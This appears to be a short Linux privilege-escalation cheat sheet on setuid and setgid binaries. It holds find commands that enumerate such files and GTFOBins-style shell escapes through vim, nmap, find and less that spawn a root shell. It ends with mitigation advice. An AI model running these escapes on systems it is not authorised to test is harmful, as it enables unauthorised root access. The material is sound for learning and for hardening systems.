# Special Permissions

## Setuid / Setgid Enumeration

```bash
# Find setuid files owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find setgid files owned by root
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Find all setuid files (any owner)
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find all setgid files (any owner)
find / -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

## GTFObins (manual check)

If you find a setuid/setgid binary, check it against:
[https://gtfobins.github.io/](https://gtfobins.github.io/)

### Examples (if binary is setuid root)

```bash
# vim
vim -c ':!/bin/sh'

# nmap
nmap --interactive
!sh

# find
find / -exec /bin/sh -p \; -quit

# less
less /etc/passwd
!/bin/sh
```

---

## Understanding setuid / setgid

### setuid (Set User ID)

* A binary with the **setuid** bit executes as the file owner.
* If the owner is **root**, the binary runs with **root privileges**.
* Shown as:
  `-rwsr-xr-x`

Example enumeration:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

### setgid (Set Group ID)

* Similar to setuid but sets **effective group ID**.
* Shown as:
  `-rwxr-sr-x`

Example enumeration:

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

---

## Privilege Escalation Potential

A setuid root binary is dangerous if it:

* calls system() or popen()
* uses unsafe PATH lookups
* has buffer overflows
* has format string issues
* loads libraries insecurely

Setgid binaries can be abused to access group-restricted files or escalate to setuid binaries indirectly.

---

## Mitigation

* **Never** trust setuid binaries — audit them routinely.
* Apply the **principle of least privilege** (very few programs ever need setuid).
* Remove setuid bits when possible.
* Custom setuid binaries must undergo **proper code review**.
* Always check discovered binaries against **GTFOBins**.
